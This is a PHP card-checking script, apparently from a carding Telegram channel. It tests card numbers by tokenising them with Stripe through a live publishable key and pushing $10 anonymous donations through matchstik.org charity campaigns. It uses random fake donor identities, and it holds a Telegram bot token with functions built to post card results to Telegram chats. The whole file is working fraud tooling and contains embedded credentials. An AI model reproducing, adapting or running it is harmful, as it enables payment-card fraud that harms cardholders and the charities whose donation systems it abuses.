<?php
// TELEGRAM @isnotdev

### BOT CHECKER API @ISNOTDEVBOT
//-- CAN BE USE IN SITE, JUST FIX IT --//

error_reporting(0);
date_default_timezone_set('Asia/Tokyo');
$delay = "5000";
$newDelay = $delay / 1000;
sleep($newDelay);

$amt = '10$';
$owner = "<a href='t.me/isnotdevbot'>isnotbot</a>";
$gateways = 'Sitebased Stripe CCN 10$';

### FUNCTIONS
if ($_SERVER['REQUEST_METHOD'] == "POST") {
 extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
 extract($_GET);
}
function GetStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);
 return $str[0];
}
function inStr($string, $start, $end, $value) {
 $str = explode($start, $string);
 $str = explode($end, $str[$value]);
 return $str[0];
}

### CC VALIDATING
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$last4 = substr($cc, -4);
$hidehit = "XXXXXXXXXXXX$last4|$mes|$ano|$cvv";
$bin = substr($cc, 0, 6);

### CARD TYPE
$ccScheme = array(
 "3" => "American Express",
 "4" => "Visa",
 "5" => "MasterCard",
 "6" => "Discover"
);
$cardScheme = $ccScheme[substr($cc, 0, 1)];

### HITSENDER
$w2s = '-1001890729455';
function hitSender ($w2s, $message) {
 $url = "https://api.telegram.org/bot6088551496:AAEdIqwtvoOG9r3Ab_KFQXf5UQJZdF-r_Gs/sendMessage?chat_id=".$w2s."&text=".$message."&parse_mode=HTML&disable_web_page_preview=true";
 file_get_contents($url);
}

$chrg = '-1001922296931';
function chargeSender ($chrg, $message) {
 $url = "https://api.telegram.org/bot6088551496:AAEdIqwtvoOG9r3Ab_KFQXf5UQJZdF-r_Gs/sendMessage?chat_id=".$chrg."&text=".$message."&parse_mode=HTML&disable_web_page_preview=true";
 file_get_contents($url);
}

function value($str, $find_start, $find_end) {
 $start = @strpos($str, $find_start);
 if ($start === false) {
  return "";
 }
 $length = strlen($find_start);
 $end = strpos(substr($str, $start +$length), $find_end);
 return trim(substr($str, $start +$length, $end));
}

function mod($dividendo, $divisor) {
 return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

### EMAIL GENERATOR
function emailGenerate($length = 10) {
 $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 $charactersLength = strlen($characters);
 $randomString = '';
 for ($i = 0; $i < $length; $i++) {
  $randomString .= $characters[rand(0, $charactersLength - 1)];
 }
 return $randomString . '@gmail.com';
}
$email = emailGenerate();

### USERNAME GENERATOR
function usernameGen($length = 13) {
 $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 $charactersLength = strlen($characters);
 $randomString = '';
 for ($i = 0; $i < $length; $i++) {
  $randomString .= $characters[rand(0, $charactersLength - 1)];
 }
 return $randomString;
}
$un = usernameGen();

### PASSWORD GENERATOR
function passwordGen($length = 15) {
 $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 $charactersLength = strlen($characters);
 $randomString = '';
 for ($i = 0; $i < $length; $i++) {
  $randomString .= $characters[rand(0, $charactersLength - 1)];
 }
 return $randomString;
}
$pass = passwordGen();

### USER DATA
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1, 3);
$numero2 = substr($phone, 6, 3);
$numero3 = substr($phone, 10, 4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com", "homtail.com", "yahoo.com.br", "bol.com.br", "yopmail.com", "outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = str_replace("example.com", $serv_rnd, $email);
if ($state == "Alabama") {
 $state = "AL";
} else if ($state == "alaska") {
 $state = "AK";
} else if ($state == "arizona") {
 $state = "AR";
} else if ($state == "california") {
 $state = "CA";
} else if ($state == "olorado") {
 $state = "CO";
} else if ($state == "connecticut") {
 $state = "CT";
} else if ($state == "delaware") {
 $state = "DE";
} else if ($state == "district of columbia") {
 $state = "DC";
} else if ($state == "florida") {
 $state = "FL";
} else if ($state == "georgia") {
 $state = "GA";
} else if ($state == "hawaii") {
 $state = "HI";
} else if ($state == "idaho") {
 $state = "ID";
} else if ($state == "illinois") {
 $state = "IL";
} else if ($state == "indiana") {
 $state = "IN";
} else if ($state == "iowa") {
 $state = "IA";
} else if ($state == "kansas") {
 $state = "KS";
} else if ($state == "kentucky") {
 $state = "KY";
} else if ($state == "louisiana") {
 $state = "LA";
} else if ($state == "maine") {
 $state = "ME";
} else if ($state == "maryland") {
 $state = "MD";
} else if ($state == "massachusetts") {
 $state = "MA";
} else if ($state == "michigan") {
 $state = "MI";
} else if ($state == "minnesota") {
 $state = "MN";
} else if ($state == "mississippi") {
 $state = "MS";
} else if ($state == "missouri") {
 $state = "MO";
} else if ($state == "montana") {
 $state = "MT";
} else if ($state == "nebraska") {
 $state = "NE";
} else if ($state == "nevada") {
 $state = "NV";
} else if ($state == "new hampshire") {
 $state = "NH";
} else if ($state == "new jersey") {
 $state = "NJ";
} else if ($state == "new mexico") {
 $state = "NM";
} else if ($state == "new york") {
 $state = "LA";
} else if ($state == "north carolina") {
 $state = "NC";
} else if ($state == "north dakota") {
 $state = "ND";
} else if ($state == "Ohio") {
 $state = "OH";
} else if ($state == "oklahoma") {
 $state = "OK";
} else if ($state == "oregon") {
 $state = "OR";
} else if ($state == "pennsylvania") {
 $state = "PA";
} else if ($state == "rhode Island") {
 $state = "RI";
} else if ($state == "south carolina") {
 $state = "SC";
} else if ($state == "south dakota") {
 $state = "SD";
} else if ($state == "tennessee") {
 $state = "TN";
} else if ($state == "texas") {
 $state = "TX";
} else if ($state == "utah") {
 $state = "UT";
} else if ($state == "vermont") {
 $state = "VT";
} else if ($state == "virginia") {
 $state = "VA";
} else if ($state == "washington") {
 $state = "WA";
} else if ($state == "west virginia") {
 $state = "WV";
} else if ($state == "wisconsin") {
 $state = "WI";
} else if ($state == "wyoming") {
 $state = "WY";
} else {
 $state = "KY";
}

### REQ 1
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=$cc&card[exp_month]=$mes&card[exp_year]=$ano&guid=2f064ebd-6455-4b31-9e8b-0f3f4e2c321c922b8a&muid=b1dcfe38-85de-4db0-bd87-a153fc3af0145b42a1&sid=56f25e73-1c1d-4d86-baad-06d3ef01c9e3e8182d&payment_user_agent=stripe.js%2F1a76abe9b7%3B+stripe-js-v3%2F1a76abe9b7%3B+split-card-element&time_on_page=101989&key=pk_live_51G3UDSD2Zsr0c6eyL78CeWh1KQ2NG9jDPimts4diEOZQz9nWl9v2AxSAp6OlNH5zpHpWh6Ge5QkvrYQvevwg0VB3001gMpJyp7&pasted_fields=number");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Cache-Control: no-cache';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Pragma: no-cache';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Sec-Ch-Ua: Not.A/Brand";v="8",';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: Windows""';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$resp = curl_exec($ch);
$token = json_decode($resp, true);
$req = "Req 1";

### REQ 2
if (isset($token['id'])) {
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.matchstik.org/graphql');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_POST, 1);
 $oID = array(
  1 => '{"operationName":"CreateDonation","variables":{"params":{"organizationId":"UDLQc5rX68","campaignId":"2vEyeuNuDW","donorType":"Individual","anonymous":true,"email":"'.$email.'","name":"'.$firstname.''.$lastname.'","phoneNumber":"'.$phone.'","address":{"streetAddress":"'.$street.'","city":"new York","state":"NewYork","zip":"10080"},"amount":1000,"coverFees":false,"message":"","stripeToken":"'.$token['id'].'","type":"One Time Donation","membershipId":"","optInToCommunication":true}},"query":"mutation CreateDonation($params: CreateDonationParams!) {\n  createDonation(params: $params) {\n    _id\n    __typename\n  }\n}\n"}',
  2 => '{"operationName":"CreateDonation","variables":{"params":{"organizationId":"EbpOFbS4qU","campaignId":"FY6JaPk31d","donorType":"Individual","anonymous":true,"email":"'.$email.'","name":"'.$firstname.''.$lastname.'","phoneNumber":"'.$phone.'","address":{"streetAddress":"'.$street.'","city":"new York","state":"NewYork","zip":"10080"},"amount":1000,"coverFees":false,"message":"","stripeToken":"'.$token['id'].'","type":"One Time Donation","membershipId":"","optInToCommunication":true}},"query":"mutation CreateDonation($params: CreateDonationParams!) {\n  createDonation(params: $params) {\n    _id\n    __typename\n  }\n}\n"}',
  3 => '{"operationName":"CreateDonation","variables":{"params":{"organizationId":"akLQ0ehVmz","campaignId":"BoBhGDWsCZ","donorType":"Individual","anonymous":true,"email":"'.$email.'","name":"'.$firstname.''.$lastname.'","phoneNumber":"'.$phone.'","address":{"streetAddress":"'.$street.'","city":"new York","state":"NewYork","zip":"10080"},"amount":1000,"coverFees":false,"message":"","stripeToken":"'.$token['id'].'","type":"One Time Donation","membershipId":"","optInToCommunication":true}},"query":"mutation CreateDonation($params: CreateDonationParams!) {\n  createDonation(params: $params) {\n    _id\n    __typename\n  }\n}\n"}',
  4 => '{"operationName":"CreateDonation","variables":{"params":{"organizationId":"Zu6FPY_qSv","campaignId":"tKnwvJVIK","donorType":"Individual","anonymous":true,"email":"'.$email.'","name":"'.$firstname.''.$lastname.'","phoneNumber":"'.$phone.'","address":{"streetAddress":"'.$street.'","city":"new York","state":"NewYork","zip":"10080"},"amount":1000,"coverFees":false,"message":"","stripeToken":"'.$token['id'].'","type":"One Time Donation","membershipId":"","optInToCommunication":true}},"query":"mutation CreateDonation($params: CreateDonationParams!) {\n  createDonation(params: $params) {\n    _id\n    __typename\n  }\n}\n"}',
  5 => '{"operationName":"CreateDonation","variables":{"params":{"organizationId":"4zd_k5L_E0","campaignId":"VgA55HyYn7","donorType":"Individual","anonymous":true,"email":"'.$email.'","name":"'.$firstname.''.$lastname.'","phoneNumber":"'.$phone.'","address":{"streetAddress":"'.$street.'","city":"new York","state":"NewYork","zip":"10080"},"amount":1000,"coverFees":false,"message":"","stripeToken":"'.$token['id'].'","type":"One Time Donation","membershipId":"","optInToCommunication":true}},"query":"mutation CreateDonation($params: CreateDonationParams!) {\n  createDonation(params: $params) {\n    _id\n    __typename\n  }\n}\n"}',
 );
 $postyy = $oID[array_rand($oID)];
 curl_setopt($ch, CURLOPT_POSTFIELDS, ''.$postyy.'');
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

 $headers = array();
 $headers[] = 'Accept-Language: en-US,en;q=0.9';
 $headers[] = 'Cache-Control: no-cache';
 $headers[] = 'Connection: keep-alive';
 $headers[] = 'Origin: https://donate.matchstik.org';
 $headers[] = 'Pragma: no-cache';
 $headers[] = 'Referer: https://donate.matchstik.org/';
 $headers[] = 'Sec-Fetch-Dest: empty';
 $headers[] = 'Sec-Fetch-Mode: cors';
 $headers[] = 'Sec-Fetch-Site: same-site';
 $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36';
 $headers[] = 'Accept: */*';
 $headers[] = 'Content-Type: application/json';
 $headers[] = 'Sec-Ch-Ua: "Not.A/Brand";v="8",';
 $headers[] = 'Sec-Ch-Ua-Mobile: ?0';
 $headers[] = 'Sec-Ch-Ua-Platform: "Windows"';
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

 $resp = curl_exec($ch);
 $req = "Req 2";
}

### BIN CHECK
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'Host: lookup.binlist.net',
 'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$binresp = curl_exec($ch);
$binresp = json_decode($binresp, true);
$bank = $binresp['bank']['name'];
$country = $binresp['country']['name'];
$emoji = $binresp['country']['emoji'];
$brand = $binresp['brand'];
$scheme = $binresp['scheme'];
$type = $binresp['type'];

if (strpos($binresp, '"type":"credit"') !== false) {
 $type = 'Credit';
} else {
 $type = 'Debit';
}

include 'response/apiresp.php';

### FIXING RESPONSE
/* echo "$resp - $req<br>"; // UNCOMMENT IF IT WILL USE IN SITE CHECKER
echo "$orgID - $campID";
echo "api: $req<br>"; */
# TELEGRAM: @isnotdev

// 盗まないでよクソ野郎！

?>